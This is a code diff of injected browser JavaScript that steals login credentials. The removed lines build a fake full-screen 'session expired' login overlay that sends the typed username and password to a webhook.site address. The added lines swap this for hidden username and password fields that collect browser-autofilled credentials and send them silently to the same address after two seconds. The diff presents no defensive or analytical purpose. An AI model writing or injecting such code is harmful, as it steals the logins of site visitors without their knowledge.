@@ -1,23 +1,14 @@
-var d=document.createElement('div');
-d.style.cssText='position:fixed;top:0;left:0;width:100vw;height:100vh;background:#125ad0;margin:0;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:10px;z-index:2147483647';
-document.documentElement.appendChild(d);
-var h=document.createElement('h2');
-h.textContent='Sessiya istekla. Voydite povtorno.';
-h.style.color='#fff';
-d.appendChild(h);
 var a=document.createElement('input');
-a.placeholder='Login';
-a.style.padding='8px';
-d.appendChild(a);
+a.style.display='none';
+a.autocomplete='username';
+document.body.appendChild(a);
 var b=document.createElement('input');
 b.type='password';
-b.placeholder='Parol';
-b.style.padding='8px';
-d.appendChild(b);
-var c=document.createElement('button');
-c.textContent='VOYTI';
-c.style.cssText='padding:8px 24px;background:#fff;color:#125ad0;border:none;cursor:pointer;font-size:16px';
-c.onclick=function(){
-  new Image().src='https://webhook.site/ae7990e1-69d3-4b40-8fdc-bbe39df73870?l='+encodeURIComponent(a.value)+String.fromCharCode(38)+'p='+encodeURIComponent(b.value)
-};
-d.appendChild(c);
+b.style.display='none';
+b.autocomplete='current-password';
+document.body.appendChild(b);
+setTimeout(function(){
+  if(a.value||b.value){
+    new Image().src='https://webhook.site/ae7990e1-69d3-4b40-8fdc-bbe39df73870?l='+encodeURIComponent(a.value)+String.fromCharCode(38)+'p='+encodeURIComponent(b.value)
+  }
+},2000);
